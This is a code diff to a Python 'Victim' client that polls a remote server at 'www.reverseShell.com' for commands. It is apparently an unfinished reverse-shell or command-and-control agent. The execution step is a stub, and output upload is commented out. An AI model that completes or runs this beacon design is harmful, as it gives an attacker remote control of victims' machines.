@@ -1,6 +1,7 @@
 import requests
 import logging
 import pickle
+import time
 
 class Victim:
 
@@ -42,17 +43,10 @@ class Victim:
 
         return response
 
-    def listVictims(self):
-        pass
+    # Ask for a command to execute
+    def askForCommand(self):
+        return self.__session.request('GET', self.__serverUrl + '/victim.php', params={'askingForCommand': 1}).text
 
-    def connectToVictim(self, victim):
-        pass
-
-    def sendCommand(self):
-        pass
-
-    def disconnectFromVictim(self):
-        pass
 
     def disconnectFromServer(self):
         return self.__session.request('GET', self.__serverUrl + '/login.php', headers={'Connection':'close'})
@@ -70,17 +64,38 @@ def main():
     # Server domain
     baseUrl = 'http://www.reverseShell.com'
 
-    # Store command
-    data = {'cmd': None}
+    # Variable to store command
+    data = {'cmd': None, 'output': None}
 
+    # Login
     victim = Victim()
+    print('Requesting login...')
     printResponse(victim.connectToServer(baseUrl))
-    #victimsList = attacker.listVictims()
-    #attacker.connectToVictim(victimsList[0])
-    #output = attacker.sendCommand('ls')
-    #print(output)
-    #attacker.disconnectFromVictim()
-    printResponse(victim.disconnectFromServer())
+
+    try:
+        while True:
+            # Ask for command to server
+            print('Asking for command...')
+            data['cmd'] = victim.askForCommand()
+            print('Command received: ', data['cmd'])
+
+            # Execute command
+            print('Executing...')
+
+            time.sleep(1)
+
+
+            # Send command output to server
+            # Send command
+            #response = requests.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
+            #response = s.request('POST', url, data=data, cookies={'__test': 'f1857067ff8936b46d925e9609d9c72c'})
+
+    # If hit Ctrl+c
+    except KeyboardInterrupt:
+        raise SystemExit
+    finally:
+        printResponse(victim.disconnectFromServer())
+
     #printResponse(requests.request('GET', baseUrl + '/modules/sessionManager.php'))
 
 
